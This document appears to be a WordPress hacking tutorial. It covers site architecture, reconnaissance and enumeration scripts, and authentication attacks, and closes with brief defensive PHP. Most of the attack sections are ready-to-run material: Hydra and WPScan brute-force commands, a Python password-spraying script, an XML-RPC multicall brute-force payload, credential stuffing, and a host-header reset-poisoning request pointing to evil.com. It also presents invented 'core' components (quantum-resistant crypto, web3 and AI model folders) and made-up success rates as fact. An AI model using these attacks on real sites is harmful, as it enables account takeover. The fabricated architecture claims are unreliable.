# Hacking-WordPress
### Intro
WordPress is an open-source Content Management System (CMS) built on PHP and MySQL/MariaDB, powering approximately 43% of all websites as of 2024. Its popularity stems from its user-friendly interface, extensive customization capabilities through plugins and themes, and a robust developer ecosystem.

**The Security Paradox**
The very features that make WordPress accessible also create significant security challenges:
- Market Dominance: 40%+ market share makes it a high-value target for automated and targeted attacks
- Extension Architecture: 60,000+ plugins and 30,000+ themes create an enormous attack surface
- Administrative Complexity: Many site administrators lack technical security expertise
- Backward Compatibility: Legacy code support often conflicts with security hardening

**Research Objectives**
This document systematically explores:
- Architectural Analysis: Deep dive into WordPress core components and their security implications
- Attack Methodologies: Comprehensive enumeration, exploitation, and post-exploitation techniques
- Defensive Strategies: Enterprise-grade hardening and monitoring approaches
- Tooling Ecosystem: Professional security assessment tools and their optimal application

**The Attack Surface (2026 Edition)**
1. Core WordPress (PHP + JavaScript)
2. Plugins (Average: 20 per site)
3. Themes (Custom + Commercial)
4. APIs (REST, GraphQL, WebSocket, gRPC)
5. Database (MySQL 8.0+, MariaDB 10.6+)
6. Server Environment (Container, Serverless, Edge)
7. Third-Party Integrations (CDN, WAF, DNS, Email)
8. AI/ML Components (Local models, API calls)
9. Blockchain/Web3 Integrations
10. Quantum-Resistant Implementations (Experimental)


**The Attacker Profile 2026**

***Script Kiddie:***
  - Uses automated tools
  - Targets known vulnerabilities
  - Success rate: <5%

***Advanced Persistent Threat:***
  - Custom exploits
  - AI-assisted reconnaissance
  - Supply chain attacks
  - Success rate: 35-40%

***State-Sponsored:***
  - Zero-day exploitation
  - Quantum computing resources
  - Infrastructure attacks
  - Success rate: 60%+

***AI Autonomous Agent:***
  - Self-learning attack patterns
  - Adaptive evasion
  - 24/7 operation
  - Success rate: Growing rapidly

### 2. WordPress Architecture: A Security Perspective
**Core Directory Structure Analysis**
```
/var/www/html/wordpress/
│
├── 📁 wp-admin/                          # Administration Interface
│   ├── 📁 css/                          # Admin styles (Version: 6.7.1)
│   │   ├── common.css                   # Common styles
│   │   ├── forms.css                    # Form styles
│   │   └── dashboard.css               # Dashboard specific
│   ├── 📁 js/                          # Admin JavaScript
│   │   ├── post.js                     # Post editor logic
│   │   ├── media-upload.js             # Media upload handling
│   │   └── password-strength-meter.js  # Password validation
│   ├── 📁 includes/                    # Admin backend
│   │   ├── file.php                    # File operations
│   │   ├── plugin.php                  # Plugin management
│   │   ├── update.php                  # Update mechanisms
│   │   └── user.php                    # User management
│   ├── 📁 network/                     # Multisite admin
│   │   ├── admin.php
│   │   └── users.php
│   ├── 📁 misc/                        # Miscellaneous
│   │   └── test.php                    # Often overlooked
│   ├── admin.php                       # Admin entry point
│   ├── admin-ajax.php                  # AJAX endpoint
│   ├── admin-post.php                  # Admin POST handler
│   ├── menu.php                        # Menu generation
│   └── user/                           # User admin
│       ├── user-edit.php
│       └── profile.php
│
├── 📁 wp-includes/                      # WordPress Core Engine
│   ├── 📁 blocks/                      # Gutenberg Block System
│   │   ├── 📁 block-library/          # Core blocks
│   │   │   ├── paragraph/
│   │   │   ├── image/
│   │   │   └── gallery/
│   │   └── 📁 patterns/               # Block patterns
│   ├── 📁 certificates/               # TLS/SSL Management (2025+)
│   │   ├── ca-bundle.crt
│   │   └── quantum-ca.crt             # Experimental
│   ├── 📁 css/                        # Frontend CSS
│   ├── 📁 fonts/                      # Web fonts
│   ├── 📁 js/                         # Frontend JavaScript
│   │   ├── jquery/                    # jQuery (v3.7.1)
│   │   ├── underscore/                # Underscore.js
│   │   └── backbone/                  # Backbone.js
│   ├── 📁 SimplePie/                  # RSS parsing
│   ├── 📁 sodium_compat/              # Cryptography
│   ├── 📁 IXR/                        # XML-RPC
│   ├── 📁 quantum-resistant/          # Post-quantum crypto (2026)
│   │   ├── Kyber.php
│   │   └── Dilithium.php
│   ├── 📁 web3/                       # Blockchain integrations
│   │   ├── ethers.php
│   │   └── smart-contract.php
│   ├── 📁 REST API/                   # REST API core
│   ├── 📁 GraphQL/                    # GraphQL support (6.6+)
│   ├── class-wp-error.php             # Error handling
│   ├── class-wp-http.php              # HTTP requests
│   ├── class-wp-db.php                # Database abstraction
│   ├── capabilities.php               # Role capabilities
│   ├── comment.php                    # Comment handling
│   ├── cron.php                       # Cron jobs
│   ├── default-filters.php            # Filter hooks
│   ├── formatting.php                 # Data formatting
│   ├── functions.php                  # Core functions
│   ├── link-template.php              # URL generation
│   ├── plugin.php                     # Plugin API
│   ├── post.php                       # Post handling
│   ├── query.php                      # Database queries
│   ├── rewrite.php                    # URL rewriting
│   ├── shortcodes.php                 # Shortcode processing
│   ├── taxonomy.php                   # Taxonomy handling
│   ├── theme.php                      # Theme API
│   ├── user.php                       # User API
│   ├── vars.php                       # Global variables
│   ├── version.php                    # Version information (⚠️)
│   ├── wp-db.php                      # Database class
│   └── wp-diff.php                    # Diff utility
│
├── 📁 wp-content/                      # User Content (Attack Surface)
│   ├── 📁 plugins/                     # Plugins (MAJOR RISK)
│   │   ├── 📁 akismet/                # Example plugin
│   │   │   ├── 📁 includes/
│   │   │   ├── 📁 vendor/             # Dependencies
│   │   │   ├── 📁 languages/
│   │   │   ├── akismet.php            # Main file
│   │   │   ├── readme.txt             # Version info
│   │   │   └── uninstall.php          # Cleanup script
│   │   ├── 📁 woocommerce/            # E-commerce
│   │   │   ├── 📁 includes/
│   │   │   ├── 📁 templates/
│   │   │   ├── 📁 assets/
│   │   │   └── woocommerce.php
│   │   ├── 📁 elementor/              # Page builder
│   │   ├── 📁 contact-form-7/         # Forms
│   │   └── 📁 custom-plugin/          # Custom code
│   │       ├── 📁 admin/
│   │       ├── 📁 public/
│   │       ├── 📁 includes/
│   │       ├── 📁 vendor/             # Often outdated
│   │       ├── main.php
│   │       ├── ajax-handler.php       # Common vuln
│   │       └── settings.php
│   ├── 📁 themes/                      # Themes
│   │   ├── 📁 twentytwentyseven/      # Default theme
│   │   │   ├── 📁 template-parts/
│   │   │   ├── 📁 assets/
│   │   │   ├── 📁 blocks/             # Block templates
│   │   │   ├── functions.php          # Theme functions
│   │   │   ├── style.css              # Theme header
│   │   │   ├── index.php              # Main template
│   │   │   ├── header.php
│   │   │   ├── footer.php
│   │   │   └── page.php
│   │   ├── 📁 custom-theme/           # Custom theme
│   │   │   ├── 📁 inc/                # Common includes
│   │   │   │   ├── custom-functions.php
│   │   │   │   └── security.php       # Often weak
│   │   │   ├── 📁 js/
│   │   │   ├── 📁 css/
│   │   │   └── functions.php
│   │   └── 📁 child-theme/            # Child themes
│   ├── 📁 uploads/                     # Media Files
│   │   ├── 📁 2026/                   # Year-based
│   │   │   ├── 📁 01/                 # Month-based
│   │   │   │   ├── image.jpg
│   │   │   │   ├── document.pdf
│   │   │   │   └── malware.php.jpg    # Double extension
│   │   │   └── 📁 02/
│   │   ├── 📁 .htaccess               # Upload restrictions
│   │   └── 📁 wpcf7_uploads/          # Form uploads
│   ├── 📁 ai-models/                   # AI Models (2025+)
│   │   ├── 📁 llm/                    # Language models
│   │   │   ├── model.bin
│   │   │   └── tokenizer.json
│   │   ├── 📁 image-gen/              # Image generation
│   │   └── 📁 training-data/          # Training data
│   ├── 📁 cache/                       # Cache files
│   │   ├── 📁 page/                   # Page cache
│   │   ├── 📁 object/                 # Object cache
│   │   └── 📁 browser/                # Browser cache
│   ├── 📁 upgrade/                     # Upgrade temp files
│   ├── 📁 languages/                   # Translation files
│   ├── 📁 mu-plugins/                  # Must-Use plugins
│   └── 📁 wflogs/                      # Wordfence logs (if installed)
│
├── 📁 .git/                            # Git repository (if exposed)
│   ├── 📁 objects/
│   ├── HEAD
│   ├── config
│   └── index
│
├── 📁 .github/                         # GitHub workflows
│   └── 📁 workflows/
│       └── deploy.yml
│
├── 📁 node_modules/                    # Node.js dependencies
├── 📁 vendor/                          # Composer dependencies
├── 📁 tests/                           # Test files
│
├── .env                                # Environment variables
├── .env.production                     # Production env
├── .env.development                    # Development env
├── .htaccess                           # Apache config
├── web.config                          # IIS config
├── robots.txt                          # Robots directives
├── sitemap.xml                         # Sitemap
├── crossdomain.xml                     # Flash policy
├── clientaccesspolicy.xml              # Silverlight policy
├── phpinfo.php                         # Often forgotten
├── test.php                            # Common test file
├── adminer.php                         # Database admin tool
│
├── wp-config.php                       # CONFIGURATION (CRITICAL)
├── wp-config-sample.php
├── wp-login.php                        # LOGIN PAGE
├── wp-signup.php                       # Multisite signup
├── wp-register.php                     # Registration
├── wp-cron.php                         # Cron trigger
├── wp-trackback.php                    # Trackback handler
├── wp-comments-post.php                # Comment submission
├── xmlrpc.php                          # XML-RPC (LEGACY)
├── xmlrpc.php.disabled                 # Common disable method
├── rest-api.php                        # REST API entry
├── graphql.php                         # GraphQL endpoint
├── index.php                           # MAIN ENTRY POINT
└── license.txt                         # License info (version)
```
**Execution Flow Analysis**
```
Your WordPress House:
├── 🏠 Front Door (index.php) - Where visitors enter
├── 🛏️ Bedroom (wp-admin) - Your private room
├── 🍳 Kitchen (wp-includes) - Cooking area (core functions)
├── 📦 Storage Room (wp-content) - Your stuff
│   ├── 🧩 Toys (plugins) - Add-ons for fun
│   ├── 🎨 Paintings (themes) - How your house looks
│   └── 📷 Photos (uploads) - Your pictures
├── 🔑 Key Box (wp-config.php) - Important keys/passwords
└── 🚪 Back Door (wp-login.php) - Where you enter
```
**Security Implications:** Each component represents a potential attack vector. The sequential loading order means early-stage compromises (e.g., modified `wp-config.php`) can affect all subsequent execution.

**Database Schema Security Analysis**
WordPress uses 12 core tables with specific security considerations:
```
wp_users                 # Contains hashed passwords, user metadata
wp_usermeta              # User capabilities, session tokens
wp_posts                 # Published content, including revisions
wp_postmeta              # Post metadata (sometimes contains sensitive data)
wp_options               # Site configuration (often contains API keys)
wp_comments              # User comments (XSS vector)
wp_commentmeta           # Comment metadata
```

**Critical Security Note:** Default table prefix `(wp_)` makes SQL injection attacks more predictable. Sensitive data in `wp_options` may include:
- SMTP credentials
- API keys
- Payment gateway information
- Debug settings

### WordPress User Management & Privilege Escalation
**Role-Based Access Control (RBAC)**
Basically, WordPress implements is a hierarchical permission system:

```
Super Administrator (Multisite only) → Full network control
      ↓
Administrator → Complete single-site control
      ↓
Editor → Publish/manage all posts and pages
      ↓
Author → Publish/manage own posts only
      ↓
Contributor → Write but not publish posts
      ↓
Subscriber → Read-only access
      ↓
Custom Roles → Plugin-defined capabilities
```

**Capability Mapping Analysis**
Each role possesses specific capabilities (permissions):
```
// Administrator capabilities (subset):
'activate_plugins', 'delete_plugins', 'edit_plugins',
'install_plugins', 'update_plugins', 'edit_files',
'edit_theme_options', 'switch_themes', 'update_themes',
'create_users', 'delete_users', 'edit_users',
'promote_users', 'remove_users', 'manage_options'
```
**Attack Surface:** Any capability granting file editing, user management, or plugin installation represents a critical security boundary.
**Privilege Escalation Vectors**
- Cross-Site Request Forgery (CSRF) in admin functions
- SQL Injection affecting user metadata
- PHP Object Injection through serialized data
- Plugin/Theme vulnerabilities with admin access requirements
- Database direct manipulation via compromised hosting

### Comprehensive Enumeration Techniques
#### Version Enumeration: Advanced Methods

**Passive Fingerprinting**
```
# HTTP Header Analysis
curl -I https://target.com | grep -i "x-powered-by\|server"

# Generator Meta Tag Extraction
curl -s https://target.com | grep -i "generator" | head -5

# RSS Feed Analysis
curl -s https://target.com/feed/ | grep -i "generator\|wordpress"

# Readme.html Detection
curl -o /dev/null -w "%{http_code}" https://target.com/readme.html
```

**Active Version Detection**
```
# CSS/JS Asset Analysis
curl -s https://target.com/wp-includes/css/ | grep -oP 'ver=\K[0-9.]+'
```

# API Endpoint Interrogation
```
curl -s https://target.com/wp-json/wp/v2/ | jq .  # May reveal version in response
```

# Login Page Analysis
```
curl -s https://target.com/wp-login.php | grep -oP 'wp\S+\.css\?ver=\K[0-9.-]+'
```

**Version-Specific Indicators**
```
WordPress 5.0+ → Gutenberg editor assets
WordPress 4.7+ → REST API enabled by default
WordPress 4.0+ → Improved admin interface
WordPress 3.0+ → Multisite capability
```
## FINDING WORDPRESS INFORMATION (ENUMERATION)
Finding WordPress Version

### Why it Matters:
Old version = Known security holes
New version = Fewer security holes
Hackers search for old versions

**How to Find Version (Easy Methods):**

***- Method 1: Check Page Source***
**Steps:**
1. Go to website
2. Press F12 (Developer Tools)
3. Look for this line - Version is here 
```
   <meta name="generator" content="WordPress 6.7.1">
```   
***- Method 2: Check Readme File***
1. Visit: https://site.com/readme.html

It will say: "Welcome to WordPress 6.7.1"

***- Method 3: Check License File***
Visit: https://site.com/license.txt

First line shows version

***- Method 4: Check Feed***
Visit: https://site.com/feed/

Search for "WordPress" - shows version

***- Method 5: Use Command Line***

// Simple check
```
curl -s https://site.com | grep -i "wordpress\|generator"
```

### Finding Plugins
**What are Plugins?**

Plugins are as like your mobile apps.

**Add extra features**

Examples: Contact forms, Galleries, Shops

**How to Find Plugins:**

**Method 1:** Check Plugin Folder
- Visit: https://site.com/wp-content/plugins/
- If you see folder list → Those are plugins

**Method 2:** Check Source Code
```
<!-- Look for lines like: -->
/wp-content/plugins/contact-form-7/

/wp-content/plugins/yoast-seo/

/wp-content/plugins/woocommerce/
```

**Method 3:** Use WPScan (Automatic)
```
wpscan --url https://site.com --enumerate p
```

This finds ALL plugins automatically!

### Common Vulnerable Plugins (2026):
**Elementor** - Page builder (often targeted)
**WooCommerce** - Online shop
**Contact Form 7** - Forms
**Yoast SEO** - Search engine optimization
**Slider Revolution** - Image sliders

### Finding Themes
What are Themes?
Like clothes for your website

Changes how it LOOKS
**Examples:** Blue theme, Dark theme, Modern theme

### How to Find Themes:

**Method 1:** Check Theme Folder
Visit: https://site.com/wp-content/themes/
You'll see theme folders

**Method 2:** Check CSS File
Visit: https://site.com/wp-content/themes/theme-name/style.css
First lines show theme info

**Method 3:** Look in Source Code
<!-- Search for: -->
/wp-content/themes/

## Finding Users
**Why Find Users?**
To guess passwords
To target specific people
To find admin users

**How to Find Users:**

**Method 1:** Check Author Pages
```
Visit: https://site.com/?author=1
If redirects to author page → User exists!

Try numbers 1-10:
/?author=1
/?author=2
/?author=3
...
/?author=10
```

## Information Gathering & Reconnaissance

### Passive Information Gathering

**What is Passive Reconnaissance?**
Gathering information WITHOUT touching the target directly.

**Method 1:** DNS Information
```
# Get domain information
whois example.com

# Get DNS records
dig example.com ANY
nslookup example.com

# Get IP address
host example.com

# Check for subdomains
# Common WordPress subdomains:
# wp.example.com
# blog.example.com
# dev.example.com
# staging.example.com
# test.example.com
```

**Method 2:** Search Engine Dorking

Using Google to find WordPress sites and information.

**Basic WordPress Dorks:**
```
site:example.com "wp-content"
site:example.com "wordpress"
site:example.com "wp-login.php"
site:example.com "wp-admin"
site:example.com inurl:wp-content
site:example.com intitle:"WordPress"
```

**Finding Vulnerable Sites:**
```
"index of" "wp-content/uploads"
"wp-content/uploads" filetype:sql
"wp-config.php" intitle:"index of"
inurl:"wp-content/plugins" "readme.txt"
```

**Finding Specific Versions:**
```
"WordPress 5.0" "wp-content"
"generator" "WordPress 4.9"
inurl:readme.html "WordPress"
```

**Method 3:** Shodan Search

Shodan is a search engine for internet-connected devices.

**Shodan Queries for WordPress:**
```
http.title:"WordPress"
http.html:"wp-content"
http.favicon.hash:-1507567067  # WordPress favicon hash
http.component:"WordPress"
```

**Method 4:** BuiltWith/Wappalyzer

Browser extensions that detect technologies.

**What They Detect:**
- WordPress version
- Plugins installed
- Themes installed
- Server information
- JavaScript libraries

### Active Information Gathering

**What is Active Reconnaissance?**
Directly interacting with the target to gather information.

**Method 1:** WordPress Version Detection

**Technique 1:** Meta Generator Tag
```
Check HTML source for version
curl -s https://example.com | grep -i "generator"
```

```
Example output:
<meta name="generator" content="WordPress 6.7.1" />
```

**Technique 2:** Readme.html File
```
Check if readme exists
curl -I https://example.com/readme.html
```

```
Read contents
curl -s https://example.com/readme.html | head -20
```

**Technique 3:** License.txt File

```
License file often shows version
curl -s https://example.com/license.txt | head -5
```

**Technique 4:** CSS/JS File Versions
```
Check admin CSS version
curl -s https://example.com/wp-admin/css/common.css | head -5
```

```
Check jQuery version
curl -s https://example.com/wp-includes/js/jquery/jquery.js | head -5
```

**Technique 5:** RSS/Atom Feeds

```
Check feed for generator tag
curl -s https://example.com/feed/ | grep -i "generator"
```

```
Example:
<generator>https://wordpress.org/?v=6.7.1</generator>
```

**Technique 6:** API Endpoints

```
Check REST API
curl -s https://example.com/wp-json/wp/v2/
````

```
Check if GraphQL is enabled
curl -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'
```` 
**Technique 7:** Error Messages

Sometimes error messages reveal version:

```
Trigger 404 error
curl -I https://example.com/nonexistent-page
```

```
Check if debug mode is on (shows PHP errors)
curl -s https://example.com/?some_invalid_parameter
```

### Method 2: Plugin Enumeration

**Step 1:** Check Plugin Directory

```
# Try to list plugins directory
curl -s https://example.com/wp-content/plugins/

# Common plugin paths to check
plugins_to_check=(
  "akismet" "contact-form-7" "yoast-seo" 
  "woocommerce" "elementor" "jetpack"
  "all-in-one-seo-pack" "wordfence" "wpforms"
)

for plugin in "${plugins_to_check[@]}"; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://example.com/wp-content/plugins/$plugin/")
  if [ "$response" != "404" ]; then
    echo "Found: $plugin"
  fi
done
```

**Step 2:** Check Source Code for Plugin References

```
# Extract plugin paths from HTML
curl -s https://example.com | \
  grep -o 'wp-content/plugins/[^"/]*' | \
  cut -d'/' -f3 | \
  sort -u

# Check CSS/JS files for plugin references
curl -s https://example.com | \
  grep -o 'plugins/[^/]*/[^"]*\.\(css\|js\)' | \
  cut -d'/' -f2 | \
  sort -u
```

**Step 3:** Check Readme Files for Versions

Plugin version from readme.txt

```
curl -s https://example.com/wp-content/plugins/plugin-name/readme.txt | \
  grep -i "stable tag\|version"
```

Plugin version from main PHP file

```
curl -s https://example.com/wp-content/plugins/plugin-name/plugin-name.php | \
  head -20 | grep -i "version"
```

**Step 4:** Check for Common Vulnerable Plugins

List of commonly exploited plugins (2026)

```
vulnerable_plugins=(
  "revslider" "gravityforms" "wordfence" 
  "wp-file-manager" "duplicator" "backwpup"
  "formidable" "ninja-forms" "visual-composer"
)

for plugin in "${vulnerable_plugins[@]}"; do
  # Check if exists
  curl -s -o /dev/null -w "%{http_code}" \
    "https://example.com/wp-content/plugins/$plugin/"
done
```

**Step 5:** Use WPScan for Plugin Detection
```
wpscan --url https://example.com --enumerate p
```

```
wpscan --url https://example.com --enumerate vp
```

```
wpscan --url https://example.com --enumerate ap
```

### Method 3: Theme Enumeration

**Step 1:** Check Theme Directory

```
// List themes directory
curl -s https://example.com/wp-content/themes/

// Common theme names to check
common_themes=(
  "twentytwentyseven" "twentytwentysix" "astra"
  "oceanwp" "generatepress" "avada" "divi"
  "enfold" "salient" "bridge"
)

for theme in "${common_themes[@]}"; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://example.com/wp-content/themes/$theme/")
  if [ "$response" != "404" ]; then
    echo "Found theme: $theme"
  fi
done
```

**Step 2:** Check Theme Version
```
// Get theme version from style.css
curl -s https://example.com/wp-content/themes/theme-name/style.css | \
  head -20 | grep -i "version\|theme name"

// Example output:
// Theme Name: Twenty Twenty-Seven
// Version: 1.0
```

**Step 3:** Check for Parent/Child Themes
```
// Check if theme has parent theme
curl -s https://example.com/wp-content/themes/theme-name/style.css | \
  grep -i "template:"

// Template line indicates parent theme
// Example: Template: parent-theme-name
```

**Step 4:** Identify Custom Themes
```
# Custom themes often have generic names
custom_indicators=(
  "custom" "mytheme" "clientname" "companyname"
  "theme2026" "newtheme" "maintheme"
)

// Also check for:
/// - Uncommon theme names
/// - Themes not in WordPress repository
/// - Themes with version 1.0 (newly created)
```

### Method 4: User Enumeration
**Why Enumerate Users?**
- To target specific users for attacks
- To find admin accounts
- For password attacks
- For social engineering

**Technique 1:** Author Pages
```
# Check author pages (old method)
for i in {1..10}; do
  echo -n "Author $i: "
  curl -s -o /dev/null -w "%{http_code}" \
    "https://example.com/?author=$i"
  echo
done

# If redirects to author page (like /author/username/)
// then user exists
```

**Technique 2:** REST API User Endpoint

```
WordPress REST API users endpoint
curl -s https://example.com/wp-json/wp/v2/users | jq .

// Example output shows all users with IDs and names
```

**Technique 3:** OEmbed Endpoint
```
// OEmbed sometimes reveals users
curl -s "https://example.com/wp-json/oembed/1.0/embed?url=https://example.com" | jq .
```

**Technique 4:** Comments Section
```
// Extract comment authors
curl -s https://example.com | \
  grep -o 'comment-author-[^"]*' | \
  sed 's/comment-author-//' | \
  sort -u
```

**Technique 5:** RSS Feed Authors
```
// Check RSS feed for authors
curl -s https://example.com/feed/ | \
  grep -o '<dc:creator><!\[CDATA\[.*\]\]></dc:creator>' | \
  sed 's/<dc:creator><!\[CDATA\[//' | \
  sed 's/\]\]><\/dc:creator>//'
```

**Technique 6:** Login Page Errors
```
// Try logging in with random username
// Error message might reveal if user exists
// "Invalid username" vs "Incorrect password"
```

**Technique 7:** WPScan User Enumeration
```
// Use WPScan to enumerate users
wpscan --url https://example.com --enumerate u

// Enumerate users via different methods
wpscan --url https://example.com --enumerate u1-10
```

**Method 5:** Directory and File Discovery

Common Sensitive Files:
```
// WordPress core files
files_to_check=(
  "wp-config.php" "wp-config.php.bak" "wp-config.php.old"
  "wp-config.php.save" "wp-config.php.backup"
  ".htaccess" ".htpasswd" "web.config"
  "phpinfo.php" "test.php" "info.php"
  "adminer.php" "phpMyAdmin.php"
  "debug.log" "error.log"
  "backup.zip" "backup.tar.gz" "backup.sql"
  ".git/config" ".env" ".env.production"
  "readme.html" "license.txt" "install.php"
)

for file in "${files_to_check[@]}"; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://example.com/$file")
  if [ "$response" != "404" ]; then
    echo "Found: $file (Status: $response)"
  fi
done
```

**Directory Enumeration:**
```
// Common directories to check
directories=(
  "wp-admin/" "wp-includes/" "wp-content/"
  "wp-content/uploads/" "wp-content/plugins/"
  "wp-content/themes/" "wp-content/upgrade/"
  "wp-content/backups/" "wp-content/cache/"
  "inc/" "includes/" "admin/" "assets/"
  "images/" "files/" "docs/" "backup/"
)

for dir in "${directories[@]}"; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://example.com/$dir")
  if [ "$response" != "404" ]; then
    echo "Directory listing possible: $dir"
  fi
done
```
**Method 6:** Server Information Discovery
Server Headers:
```
// Check server headers
curl -I https://example.com

Look for:
- Server: Apache/2.4.41 (Ubuntu)
- X-Powered-By: PHP/7.4.3
- X-Powered-By: ASP.NET
```

**PHP Information:**
```
// Check if phpinfo is exposed
curl -s https://example.com/phpinfo.php | grep -i "php version"

// Check PHP errors (if display_errors is on)
curl -s "https://example.com/?param=<script>"
```

**WAF Detection:**
```
// Check for WAF headers
curl -I https://example.com | grep -i \
  "cloudflare\|sucuri\|wordfence\|akamai\|imperva"
```

**Common WAF headers:**
- cf-ray (Cloudflare)
- x-sucuri-id (Sucuri)
- x-wf-protection-1 (Wordfence)

## Authentication Attacks & User Enumeration

### Login Page Analysis

**Default Login Locations:**

1. /wp-login.php (Default)
2. /wp-admin/ (Redirects to wp-login.php)
3. /login/ (Custom login pages)
4. /admin/ (Custom admin pages)
5. /dashboard/ (Some themes/plugins)

**Checking Login Page:**
```
// Check if login page exists
curl -I https://example.com/wp-login.php
```
```
// Check login page content
curl -s https://example.com/wp-login.php | grep -i "login\|password"
```

## Brute Force Attacks

**What is Brute Force?**

Trying many passwords until one works.

**Manual Brute Force:**
```
// Simple curl login attempt
curl -X POST https://example.com/wp-login.php \
  -d "log=admin&pwd=password123&wp-submit=Log+In" \
  -c cookies.txt
```
- Check if login successful
- Successful login redirects to /wp-admin/
- Failed login shows error message

**Using Hydra (Advanced):**
```
// Basic Hydra command
hydra -l admin -P passwords.txt \
  example.com http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect"
  
* Options explained:
* -l admin          # Username to try
* -P passwords.txt  # Password list file
* http-post-form    # HTTP POST form attack
* F=incorrect       # Failure string (shows on failed login)
```
**Using WPScan for Brute Force:**

```
// Brute force with WPScan
wpscan --url https://example.com \
  --usernames admin \
  --passwords /usr/share/wordlists/rockyou.txt
```

```
// Multiple usernames
wpscan --url https://example.com \
  --usernames admin,administrator,root \
  --passwords common-passwords.txt
```  
**Password Lists:**

Common password lists to use:

```
// Built-in Kali wordlists
/usr/share/wordlists/rockyou.txt      # 14 million passwords
/usr/share/wordlists/fasttrack.txt    # Common passwords
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

- Create custom wordlists
- Common password patterns:
- companyname2026, Company@2026, Company123!
- season+year: Summer2026, Winter@2026
- sports+year: Football2026, Soccer#2026
```
### Password Spraying
**What is Password Spraying?**

Trying ONE common password against MANY users.

**Why it works:**
- Many users use common passwords
- Avoids account lockouts
- Less suspicious than brute force

**Example:**
```
Password: "Spring2026!"
Try against: admin, administrator, john, mary, david, etc.
```

**Password Spraying Script:**
```
import requests

users = ['admin', 'administrator', 'wpadmin', 'superadmin']
password = 'Company@2026'
login_url = 'https://example.com/wp-login.php'

for user in users:
    data = {
        'log': user,
        'pwd': password,
        'wp-submit': 'Log In'
    }
    response = requests.post(login_url, data=data)
    if 'wp-admin' in response.url:
        print(f'SUCCESS: {user}:{password}')
```

### Credential Stuffing
**What is Credential Stuffing?**

Using leaked username/password pairs from other sites.

Why it works:
- People reuse passwords
- Many credentials available from data breaches
- Automated attacks possible

**Tools for Credential Stuffing:**
```
Using Hydra with combo list
hydra -C credentials.txt \
  example.com http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect"
- credentials.txt format:
- username:password
- admin:admin123
- john:password123
```

## XML-RPC Attacks

**What is XML-RPC?**

Old WordPress feature for remote access. Often enabled by default.

**Why it's dangerous:**
- Can be used for brute force
- Amplifies attacks (multicall)
- Often not rate-limited

**Checking if XML-RPC is enabled:**
```
// Check XML-RPC
curl -X POST https://example.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

// If returns list of methods → XML-RPC enabled
```

### Brute Force via XML-RPC:
```
<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>  <!-- Username -->
    <param><value>password123</value></param>  <!-- Password -->
  </params>
</methodCall>
```

### Amplified Attack (Multicall):
```
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <array>
        <data>
          <!-- 1000 login attempts in one request -->
          <value>
            <struct>
              <member>
                <name>methodName</name>
                <value>wp.getUsersBlogs</value>
              </member>
              <member>
                <name>params</name>
                <value>
                  <array>
                    <data>
                      <value>admin</value>
                      <value>password1</value>
                    </data>
                  </array>
                </value>
              </member>
            </struct>
          </value>
          <!-- Repeat for password2, password3, etc. -->
        </data>
      </array>
    </param>
  </params>
</methodCall>
```

### REST API Authentication Attacks

**WordPress REST API Endpoints:**
```
/wp-json/wp/v2/users     # List users
/wp-json/wp/v2/posts     # List posts
/wp-json/wp/v2/comments  # List comments
```

**Authentication Methods:**
* Cookie Authentication (for logged-in users)
* Basic Authentication (if plugin enabled)
* Application Passwords (WordPress 5.6+)
* JWT Authentication (via plugins)

### Checking for Authentication Issues:
```
// Check if REST API is accessible
curl -s https://example.com/wp-json/wp/v2/users
```
- If returns users without authentication → INSECURE
- Should require authentication or return limited data

## Two-Factor Authentication (2FA) Bypass
### Common 2FA Bypass Methods:

**1. Session Hijacking**
- Steal session cookies
- Use before 2FA is required

**2. Social Engineering**
- Trick user into providing 2FA code
- Fake login pages

**3. SIM Swapping**
- Take over phone number
- Receive 2FA SMS codes

**4. Backup Code Theft**
- Steal backup codes
- Often stored insecurely

**5. 2FA Fatigue**
- Send many 2FA requests
- User approves accidentally

## Password Reset Attacks
**Password Reset Flow:**
- User requests password reset
- System sends email with reset link
- User clicks link, sets new password

**Attack Vectors:**
1. Email Account Compromise
- Hack user's email
- Intercept reset email

2. Predictable Reset Tokens
- Some sites use predictable tokens
- Like: md5(username + timestamp)
- Can be guessed or brute forced

### Host Header Injection
```
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

user_login=admin&redirect_to=http://example.com
```

### Password Reset Poisoning

- Manipulate reset link to go to attacker's site
- Capture password when user sets it

## Protection Against Authentication Attacks

**Strong Password Policy:**
```
// Enforce strong passwords
function enforce_strong_password($errors, $update, $user) {
    if (!empty($_POST['pass1'])) {
        $password = $_POST['pass1'];
        
        // Minimum 12 characters
        if (strlen($password) < 12) {
            $errors->add('pass', 'Password must be at least 12 characters');
        }
        
        // Require mixed case
        if (!preg_match('/[a-z].*[A-Z]|[A-Z].*[a-z]/', $password)) {
            $errors->add('pass', 'Password must contain both uppercase and lowercase letters');
        }
        
        // Require numbers
        if (!preg_match('/\d/', $password)) {
            $errors->add('pass', 'Password must contain at least one number');
        }
        
        // Require special characters
        if (!preg_match('/[^A-Za-z0-9]/', $password)) {
            $errors->add('pass', 'Password must contain at least one special character');
        }
    }
    return $errors;
}
add_filter('user_profile_update_errors', 'enforce_strong_password', 10, 3);
```

### Login Attempt Limiting:
```
// Track failed login attempts
function track_failed_logins($username) {
    $ip = $_SERVER['REMOTE_ADDR'];
    $transient_name = 'failed_login_' . $ip;
    $failed_attempts = get_transient($transient_name);
    
    if ($failed_attempts === false) {
        $failed_attempts = 1;
        set_transient($transient_name, $failed_attempts, HOUR_IN_SECONDS);
    } else {
        $failed_attempts++;
        set_transient($transient_name, $failed_attempts, HOUR_IN_SECONDS);
    }
    
    // Block after 5 attempts
    if ($failed_attempts >= 5) {
        // Log IP, block further attempts
        // Send alert to admin
    }
}
